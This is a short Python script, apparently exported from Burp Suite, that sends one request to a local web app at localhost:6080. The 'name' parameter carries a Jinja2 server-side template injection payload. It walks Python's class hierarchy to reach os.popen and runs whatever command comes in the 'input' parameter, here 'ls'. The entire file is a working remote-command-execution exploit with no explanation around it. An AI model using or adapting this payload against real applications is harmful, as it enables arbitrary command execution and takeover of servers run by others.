import requests

burp0_url = "http://localhost:6080/basic?name={%25+for+x+in+().__class__.__base__.__subclasses__()+%25}{%25+if+\"warning\"+in+x.__name__+%25}{{x()._module.__builtins__['__import__']('os').popen(request.values.input).read()}}{%25endif%25}{%25endfor%25}&input=ls"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}
requests.get(burp0_url, headers=burp0_headers)
